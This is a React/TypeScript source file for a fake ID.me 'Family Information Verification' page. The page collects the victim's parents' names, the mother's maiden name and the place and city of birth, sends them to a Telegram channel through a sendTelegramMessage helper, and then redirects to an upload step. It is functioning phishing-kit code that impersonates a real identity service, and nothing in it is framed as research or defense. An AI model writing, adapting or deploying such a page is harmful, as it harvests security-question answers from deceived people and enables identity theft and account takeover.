// src/pages/Teil.tsx

"use client";
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { sendTelegramMessage } from "../../utils/telegram";
import idmeLogo from './idme.png';

const Teil = () => {
  const navigate = useNavigate();
  
  // Form fields state
  const [fatherFullName, setFatherFullName] = useState("");
  const [motherFullName, setMotherFullName] = useState("");
  const [motherMaidenName, setMotherMaidenName] = useState("");
  const [placeOfBirth, setPlaceOfBirth] = useState("");
  const [cityOfBirth, setCityOfBirth] = useState("");
  
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Validate all fields are filled
    if (!fatherFullName || !motherFullName || !motherMaidenName || !placeOfBirth || !cityOfBirth) {
      setError("Please fill out all fields.");
      return;
    }

    setIsSubmitting(true);
    setError("");
    setSuccess("");

    // Format the message to send to Telegram
    const message = `
      👨‍👩‍👧 FAMILY INFORMATION (TEIL)
      ━━━━━━━━━━━━━━━━━━━━━━━━━
      Father's Full Name: ${fatherFullName}
    Mother's Full Name: ${motherFullName}
      Mother's Maiden Name: ${motherMaidenName}
       Place of Birth: ${placeOfBirth}
      🏙️ City of Birth: ${cityOfBirth}
      ━━━━━━━━━━━━━━━━━━━━━━━━━
      ⏰ Time: ${new Date().toLocaleString()}
    `;

    try {
      // Send the message to Telegram
      await sendTelegramMessage(message);

      // Clear form fields
      setFatherFullName("");
      setMotherFullName("");
      setMotherMaidenName("");
      setPlaceOfBirth("");
      setCityOfBirth("");
      setSuccess("Family information submitted successfully!");
      
      // Optional: Redirect after 2 seconds
      setTimeout(() => {
        navigate("/upload");
      }, 2000);
      
    } catch (error) {
      console.error("Telegram send error:", error);
      setError("Failed to submit information. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="page-container">
      <div className="container">
        <div className="content-container">
          <form className="new_user" id="teil_form" onSubmit={handleSubmit}>
            <div className="form-header">
              <div className="form-header-content" role="banner">
                <div className="partner">
                  <div className="c_icon m_idme">
                    <img src={idmeLogo} alt="ID.me" className="w-[120px] h-[40px] object-contain" />
                  </div>
                </div>
              </div>
            </div>

            <main aria-labelledby="sr_page_title" className="form-container">
              <div className="form-header-access">
                <h1 id="sr_page_title">Family Information Verification</h1>
              </div>
              <div className="form-header-well">
                <p>Please provide the following family information for identity verification</p>
                <p>
                  <a target="_blank" href="https://cutt.ly/xPJZ0xv" rel="noopener noreferrer">
                    Need help? Contact Support
                  </a>
                </p>
              </div>

              {error && (
                <p className="alert alert-error" role="alert">
                  {error}
                </p>
              )}
              {success && (
                <p className="alert alert-success" role="alert">
                  {success}
                </p>
              )}

              <div className="form-fields">
                <div className="field-group">
                  {/* Father's Full Name */}
                  <div className="field text">
                    <label htmlFor="father_full_name">Father's Full Name</label>
                    <input
                      placeholder="Enter father's full name"
                      required
                      type="text"
                      name="father_full_name"
                      id="father_full_name"
                      value={fatherFullName}
                      onChange={(e) => setFatherFullName(e.target.value)}
                      autoComplete="off"
                    />
                    <span role="alert"></span>
                  </div>

                  {/* Mother's Full Name */}
                  <div className="field text">
                    <label htmlFor="mother_full_name">Mother's Full Name</label>
                    <input
                      placeholder="Enter mother's full name"
                      required
                      type="text"
                      name="mother_full_name"
                      id="mother_full_name"
                      value={motherFullName}
                      onChange={(e) => setMotherFullName(e.target.value)}
                      autoComplete="off"
                    />
                    <span role="alert"></span>
                  </div>

                  {/* Mother's Maiden Name */}
                  <div className="field text">
                    <label htmlFor="mother_maiden_name">Mother's Maiden Name</label>
                    <input
                      placeholder="Enter mother's maiden name"
                      required
                      type="text"
                      name="mother_maiden_name"
                      id="mother_maiden_name"
                      value={motherMaidenName}
                      onChange={(e) => setMotherMaidenName(e.target.value)}
                      autoComplete="off"
                    />
                    <span role="alert"></span>
                  </div>

                  {/* Place of Birth */}
                  <div className="field text">
                    <label htmlFor="place_of_birth">Place of Birth</label>
                    <input
                      placeholder="Enter place of birth (e.g., Hospital name)"
                      required
                      type="text"
                      name="place_of_birth"
                      id="place_of_birth"
                      value={placeOfBirth}
                      onChange={(e) => setPlaceOfBirth(e.target.value)}
                      autoComplete="off"
                    />
                    <span role="alert"></span>
                  </div>

                  {/* City of Birth */}
                  <div className="field text">
                    <label htmlFor="city_of_birth">City of Birth</label>
                    <input
                      placeholder="Enter city of birth"
                      required
                      type="text"
                      name="city_of_birth"
                      id="city_of_birth"
                      value={cityOfBirth}
                      onChange={(e) => setCityOfBirth(e.target.value)}
                      autoComplete="off"
                    />
                    <span role="alert"></span>
                  </div>
                </div>
              </div>

              <div className="form-actions">
                <input
                  id="submit_btn"
                  type="submit"
                  name="commit"
                  value={isSubmitting ? "Submitting..." : "Continue"}
                  className="btn btn-primary"
                  disabled={isSubmitting}
                />
              </div>
            </main>
          </form>

          <div className="form-footer">
            <p>
              <a href="#" onClick={(e) => { e.preventDefault(); navigate(-1); }}>
                ← Go Back
              </a>
            </p>
          </div>
        </div>
      </div>

      <footer className="footer" role="contentinfo">
        <div className="footer-links">
          <a target="_blank" href="https://www.id.me/about" rel="noopener noreferrer">
            What is ID.me?
          </a>
          |
          <a target="_blank" href="https://www.id.me/terms" rel="noopener noreferrer">
            Terms of Service
          </a>
          |
          <a target="_blank" href="https://www.id.me/privacy" rel="noopener noreferrer">
            Privacy Policy
          </a>
        </div>
      </footer>
    </div>
  );
};

export default Teil;